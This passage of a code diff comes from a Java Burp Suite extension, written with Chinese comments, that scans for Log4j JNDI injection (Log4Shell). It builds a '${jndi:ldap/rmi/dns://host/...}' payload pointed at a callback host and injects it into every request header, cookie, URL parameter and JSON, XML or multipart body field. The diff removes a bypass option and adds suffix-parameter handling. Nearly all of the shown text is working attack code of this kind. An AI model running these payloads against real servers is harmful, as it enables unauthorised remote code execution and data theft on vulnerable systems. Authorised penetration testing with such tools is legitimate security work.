-                    body = body.replace("\n" + str + "\r\n--" , "\n" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) + "\r\n--");
+                    body = body.replace("\n" + str + "\r\n--" , "\n" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) + "\r\n--");
             }
 
 
@@ -1846,40 +1845,40 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
             if (request_header.get(i).contains("User-Agent:") || request_header.get(i).contains("token:") || request_header.get(i).contains("Token:") || request_header.get(i).contains("Bearer Token:"))
                 if (this.isuseUserAgentTokenXff) // 是否测试UA头、token、X-Forward-for头以及X-Client-IP头
-                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
+                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
 
             if (request_header.get(i).contains("X-Forwarded-For:") && this.isuseUserAgentTokenXff){
-                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
+                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
             }
 
 //            if (request_header.get(i).contains("X-Client-IP:") && this.isuseUserAgentTokenXff){
-//                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
+//                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
 //            }
 
 
             if (request_header.get(i).contains("X-Api-Version:") && this.isuseUserAgentTokenXff){
-                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
+                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
             }
 
             // Content-Type、Referer、Accept-Language、Accept、Accept-Encoding、Origin等都有可能成为触发点
             if (request_header.get(i).contains("Content-Type:") && this.isuseContenttype)
 //                    stdout.println(isuseRefererOrigin);
-                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl.replace("%24","$"),firstheaders[0],host,isusepointBypas, param_i++,this.isipincreasing));
+                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl.replace("%24","$"),firstheaders[0],host, param_i++,this.isipincreasing));
 
             if ((request_header.get(i).contains("Referer:") || request_header.get(i).contains("referer:") ) && this.isuseRefererOrigin)
-                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
             if (request_header.get(i).contains("Accept-Language:") && this.isuseAccept)
-                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
             if (request_header.get(i).contains("Accept:") && this.isuseAccept)
-                request_header.set(i, request_header.get(i) + ","+ vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                request_header.set(i, request_header.get(i) + ","+ vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
             if (request_header.get(i).contains("Accept-Encoding:") && this.isuseAccept)
-                request_header.set(i, request_header.get(i) + "," + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                request_header.set(i, request_header.get(i) + "," + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
             if (request_header.get(i).contains("Origin:") && this.isuseRefererOrigin)
-                request_header.set(i, request_header.get(i) + "," + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                request_header.set(i, request_header.get(i) + "," + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
 
 //                stdout.println("1197");
@@ -1887,7 +1886,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
             for (String xff:xff_lists)
                 if (request_header.get(i).contains(xff + ":"))
-                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
             if (request_header.get(i).contains("cookie:") || request_header.get(i).contains("Cookie:") ) {
                 if (request_header.get(i).contains("cookie:")) {
@@ -1901,7 +1900,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                     String[] cookies_lists = cookies.split(";"); // 根据; 分割cookie
                     for (String cookie_single : cookies_lists) {  // 把分割出来的单个cookie的值进行vulnurl添加
                         String[] cookie_single_lists = cookie_single.split("=");
-                        cookie_total.append(cookie_single_lists[0]).append("=").append(vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing)).append("; ");
+                        cookie_total.append(cookie_single_lists[0]).append("=").append(vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing)).append("; ");
                     }
                     if (lowup.contains("up"))
                         request_header.set(i, "Cookie:" + cookie_total); // Cookie头增加
@@ -1917,19 +1916,20 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
             for (String headers_host_single : headers_lists) // 白名单设置
             {
                 if (!request_header.contains(headers_host_single + ":")) // 如果自定义header的参数，就增加
-                    request_header.add( headers_host_single + ":" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                    request_header.add( headers_host_single + ":" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
             }
         }
         // 参数头由于参数问题，XFF头 如果没有参数，还会自动加上
         if (!request_header.contains("X-Forwarded-For:") ) // 如果没有xff头，就增加
-            request_header.add( "X-Forwarded-For: " + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+            request_header.add( "X-Forwarded-For: " + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
         for (int j = 0; j < request_header.size() ; j++){
             if (j != 0) {
                 // 对payload进行优化，在测试某些系统中发现，$符号会造成请求不解析，具体可以在内网某远A8系统找到该类情况，但是由于在
                 // 内网VMWARE测试发现，如果Content-type中的$进行url编码，会触发不了漏洞，故增加改动如下，正常uri请求中header携带
                 // 的请求头中的$进行编码处理，payload的uri请求头中header携带的请求头中的$不进行编码处理
-                code_headers.add(request_header.get(j).replace("%20user","test"));
+                code_headers.add(request_header.get(j).replace("%20"," "));
+//                code_headers.add(request_header.get(j).replace("%20user","user"));
             }
             else if(j == 0) {
                 code_headers.add(firstrequest_header);
@@ -2399,12 +2399,6 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                             return;
                         }
 
-                        if (output.contains("isusepointbypass=0")){
-                            this.isusepointBypas = false;
-                        }else{
-                            this.isusepointBypas = true;
-                        }
-
                         if (output.contains("isuseUserAgentTokenXff=0")){
                             this.isuseUserAgentTokenXff = false;
                         }else{
@@ -2450,6 +2444,8 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         }
                         this.dnsldaprmi = FileGetValue(f, "dnsldaprmi").trim();
                         this.jndiparam = FileGetValue(f,"jndiparam").trim();
+                        this.suffixparam = FileGetValue(f,"suffixparam").trim();
+                        this.usereplaceparam = FileGetValue(f,"usereplaceparam").trim();
 
                         if (this.logxn_dnslog.contains("configure ceye api") && output.contains("isuseceye=0") && output.contains("isuseprivatedns=0")) {
 //                    stdout.println("1");
@@ -2506,8 +2502,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                     String total_uri = "";
                     String[] uris = uri.split("\\.");
                     for(String uri_single:uris) {
-                        if (!uri_single.equals(""))
-                            total_uri = total_uri + "." + uri_single.substring(0,1);
+                        if (!uri_single.equals("")) { // 0.20.0
+                            if ( uri_single.length() > 63)
+                                total_uri = total_uri + "." + uri_single.substring(0,1); // 0.20.0 uri的第一个字母拼接
+                            else
+                                total_uri = total_uri + "." + uri_single;
+                        }
                     }
                     uri = total_uri;
                     String vulnurl = "";
@@ -2534,6 +2534,9 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "//" + this.logxn_dnslog.trim() + "/%20user}";
                     }
 
+                    if (!this.suffixparam.equals("/%20user") && this.suffixparam.contains("/")) // 0.20.0
+                        vulnurl = vulnurl.replace("/%20user",this.suffixparam);
+
                     String uri_total = "";
 
                     // uri黑名单，如果匹配到不进行扫描
@@ -2549,7 +2552,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
                     /*****************获取body 方法一**********************/
                     if(!firstheaders[1].contains("?")) {  // 无参情况，直接在路径后面添加payload
-                        firstheaders[1] = firstheaders[1] + "/" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing);
+                        firstheaders[1] = firstheaders[1] + "/" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing);
                     }
 
                     // 这里一直到POST的行，因为GET、POST、PUT等其他请求都可能请求的uri有参数
@@ -2561,7 +2564,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                             requries = requris[1].split("&");
                             for (String uri_single : requries) {
                                 String[] uri_single_lists = uri_single.split("=");
-                                uri_total = uri_total + uri_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) + "&";
+                                uri_total = uri_total + uri_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) + "&";
                             }
                             uri_total = uri_total.substring(0, uri_total.length() - 1);
                         }
@@ -2591,7 +2594,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                             String[] bodys_single = body.split("&");
                             for(String body_single:bodys_single) {
                                 String[] body_single_lists = body_single.split("=");
-                                body_total = body_total + body_single_lists[0] + "="  + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) +  "&" ;
+                                body_total = body_total + body_single_lists[0] + "="  + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) +  "&" ;
                             }
                             //System.out.println(body_total);
                             body_total = body_total.substring(0,body_total.length()-1);
@@ -2604,7 +2607,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         else if( !body.contains("={") && body.contains("{") && !body.contains("&") && body.contains("\":\"") && !body.contains(":{\"") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml")){
                             JSONObject jsonObject = JSON.parseObject(body);
                             for (String key:jsonObject.keySet()) {
-                                jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                                jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                             }
                             body = jsonObject.toString();
                         }
@@ -2620,12 +2623,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                                     String[] body_single_lists = body_single.split("=");
                                     JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
                                     for (String key:jsonObject.keySet()) {
-                                        jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                                        jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                                     }
                                     body_total = body_total + body_single_lists[0] + "=" + jsonObject.toString() + "&";
                                 }else {
                                     String[] body_single_lists = body_single.split("=");
-                                    body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) + "&";
+                                    body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) + "&";
                                 }
                             }
                             body_total = body_total.substring(0,body_total.length()-1);
@@ -2641,12 +2644,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                                 String[] body_single_lists = body.split(body.split("=")[0] + "=");
                                 JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
                                 for (String key:jsonObject.keySet()) {
-                                    jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                                    jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                                 }
                                 body_total = body_total + body.split("=")[0] + "=" + jsonObject.toString();
                             }else {
                                 String[] body_single_lists = body.split("=");
-                                body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) ;
+                                body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) ;
                             }
                             body = body_total;
                         }
@@ -2663,10 +2666,10 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                                 if (jsonObject.getString(key).contains("{")){
                                     JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
                                     for (String key2:jsonObject2.keySet())
-                                        jsonObject2.put(key2,vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                                        jsonObject2.put(key2,vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                                     jsonObject.put(key,jsonObject2);
                                 } else
-                                    jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                                    jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                             }
                             body = body_code.split("=")[0] + "=" + jsonObject.toString();
                         }
@@ -2679,10 +2682,10 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                                 if (jsonObject.getString(key).contains("{")){
                                     JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
                                     for (String key2:jsonObject2.keySet())
-                                        jsonObject2.put(key2,vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                                        jsonObject2.put(key2,vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                                     jsonObject.put(key,jsonObject2);
                                 } else
-                                    jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                                    jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                             }
                             body = jsonObject.toString();
                         }
@@ -2709,7 +2712,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                                 for (String body_single : bodys_single) {
                                     if (!body_single.contains("?xml")) {
                                         String[] body_single_lists = body_single.split("=");
-                                        body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) + "&";
+                                        body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) + "&";
                                     } else {
                                         String[] body_single_lists = body_single.split("=");
                                         List<String> list = new ArrayList<String>();
@@ -2721,7 +2724,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 //                        System.out.println(m.group(1));
                                         }
                                         for (String str : list) {
-                                            body_single_lists[1] = body_single_lists[1].replace(">" + str + "</", ">" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) + "</");
+                                            body_single_lists[1] = body_single_lists[1].replace(">" + str + "</", ">" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) + "</");
                                         }
                                         body_total = body_total + body_single_lists[0] + "=" + body_single_lists[1];
                                     }
@@ -2748,7 +2751,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 //                        System.out.println(m.group(1));
                             }
                             for (String str: list){
-                                body = body.replace(">" + str + "</",">" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) + "</");
+                                body = body.replace(">" + str + "</",">" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) + "</");
                             }
                         }
 
@@ -2764,7 +2767,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 //                        stdout.println(m.group(1));
                             }
                             for ( String str : list_multipart)
-                                body = body.replace("\n" + str + "\r\n--" , "\n" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) + "\r\n--");
+                                body = body.replace("\n" + str + "\r\n--" , "\n" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) + "\r\n--");
                         }
                         body = body.replace("$","%24"); // 对请求体的{、}、$、/进行编码
 
@@ -2788,35 +2791,35 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                     for (int i = 0; i < request_header.size(); i++) {
                         if (request_header.get(i).contains("User-Agent:") || request_header.get(i).contains("token:") || request_header.get(i).contains("Token:") || request_header.get(i).contains("Bearer Token:"))
                             if (this.isuseUserAgentTokenXff) // 是否测试UA头、token、X-Forward-for头以及X-Client-IP头
-                                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
+                                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
 
                         if (request_header.get(i).contains("X-Forwarded-For:") && this.isuseUserAgentTokenXff){
-                            request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
+                            request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
                         }
 
 //                if (request_header.get(i).contains("X-Client-IP:") && this.isuseUserAgentTokenXff){
-//                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
+//                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing)); // UA头增加 token增加(jwt)
 //                }
 
                         // Content-Type、Referer、Accept-Language、Accept、Accept-Encoding、Origin等都有可能成为触发点
                         if (request_header.get(i).contains("Content-Type:") && this.isuseContenttype)
 //                    stdout.println(isuseRefererOrigin);
-                            request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl.replace("%24","$"),firstheaders[0],host,isusepointBypas, param_i++,this.isipincreasing));
+                            request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl.replace("%24","$"),firstheaders[0],host, param_i++,this.isipincreasing));
 
                         if ((request_header.get(i).contains("Referer:") || request_header.get(i).contains("referer:") ) && this.isuseRefererOrigin)
-                            request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                            request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
                         if (request_header.get(i).contains("Accept-Language:") && this.isuseAccept)
-                            request_header.set(i,request_header.get(i) + "," + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                            request_header.set(i,request_header.get(i) + "," + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
                         if (request_header.get(i).contains("Accept:") && this.isuseAccept)
-                            request_header.set(i, request_header.get(i) + "," + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                            request_header.set(i, request_header.get(i) + "," + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
                         if (request_header.get(i).contains("Accept-Encoding:") && this.isuseAccept)
-                            request_header.set(i,request_header.get(i) + "," + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                            request_header.set(i,request_header.get(i) + "," + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
                         if (request_header.get(i).contains("Origin:") && this.isuseRefererOrigin)
-                            request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                            request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
 
 //                stdout.println("1197");
@@ -2824,7 +2827,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
 //                for (String xff:xff_lists)
 //                    if (request_header.get(i).contains(xff + ":"))
-//                        request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+//                        request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
                         if (request_header.get(i).contains("cookie:") || request_header.get(i).contains("Cookie:") ) {
                             if (request_header.get(i).contains("cookie:")) {
@@ -2838,7 +2841,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                                 String[] cookies_lists = cookies.split(";"); // 根据; 分割cookie
                                 for (String cookie_single : cookies_lists) {  // 把分割出来的单个cookie的值进行vulnurl添加
                                     String[] cookie_single_lists = cookie_single.split("=");
-                                    cookie_total.append(cookie_single_lists[0]).append("=").append(vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing)).append("; ");
+                                    cookie_total.append(cookie_single_lists[0]).append("=").append(vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing)).append("; ");
                                 }
                                 if (lowup.contains("up"))
                                     request_header.set(i, "Cookie:" + cookie_total); // Cookie头增加
@@ -2853,7 +2856,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 //                        String cookies = request_header.get(i).replace("cookie:", "").replace("Cookie:", "");//去掉cookie: 、Cookie:
 //                        String[] cookies_lists = cookies.split(";"); // 根据; 分割cookie
 //                        String[] cookie_single_0 = cookies_lists[0].split("=");
-//                        cookies_lists[0] = cookie_single_0[0] + "=" + cookie_single_0[1] + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing);
+//                        cookies_lists[0] = cookie_single_0[0] + "=" + cookie_single_0[1] + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing);
 //                        for (String cookie_single : cookies_lists) {  // 把分割出来的单个cookie的值进行vulnurl添加
 //                            cookie_total.append(cookie_single).append("; ");
 //                        }
@@ -2866,7 +2869,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                     }
 //            for (String xff:xff_lists)
 //                if (!request_header.contains(xff + ":") && this.isuseXfflists )  // 是否用xff列表测试，包含其他标识IP头
-//                    request_header.add(xff + ": 127.0.0.1 " + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+//                    request_header.add(xff + ": 127.0.0.1 " + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
 //            stdout.println("1238");
 //            stdout.println(request_header.get(0));
@@ -2875,31 +2878,31 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         for (String headers_host_single : headers_lists) // 白名单设置
                         {
                             if (!request_header.contains(headers_host_single + ":")) // 如果自定义header的参数，就增加
-                                request_header.add( headers_host_single + ":" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                                request_header.add( headers_host_single + ":" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                         }
                     }
 
                     if (!request_header.contains("X-Forwarded-For:") ) // 如果没有xff头，就增加
-                        request_header.add( "X-Forwarded-For: " + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                        request_header.add( "X-Forwarded-For: " + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
                     // 如果没有参数，那么将不会测试
 //            if (!request_header.contains("Content-Type:") && this.isuseRefererOrigin)
-//                request_header.add( "Content-Type: text/plain;charset=UTF-8 " + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+//                request_header.add( "Content-Type: text/plain;charset=UTF-8 " + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 //
 //            if ((!request_header.contains("Referer:") || !request_header.contains("referer:") ) && this.isuseRefererOrigin)
-//                request_header.add( "Referer: https://www.google.com " + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+//                request_header.add( "Referer: https://www.google.com " + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 //
 //            if (!request_header.contains("Accept-Language:") && this.isuseAccept)
-//                request_header.add( "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 " + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+//                request_header.add( "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 " + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 //
 //            if (!request_header.contains("Accept:") && this.isuseAccept)
-//                request_header.add( "Accept: */* " + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+//                request_header.add( "Accept: */* " + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 //
 //            if (!request_header.contains("Accept-Encoding:") && this.isuseAccept)
-//                request_header.add( "Accept-Encoding: gzip, deflate " + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+//                request_header.add( "Accept-Encoding: gzip, deflate " + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 //
 //            if (!request_header.contains("Origin:") && this.isuseRefererOrigin)
-//                request_header.add( "Origin: https://www.google.com " + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+//                request_header.add( "Origin: https://www.google.com " + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
 
                     for (int j = 0; j < request_header.size() ; j++){
                         if (j != 0) {
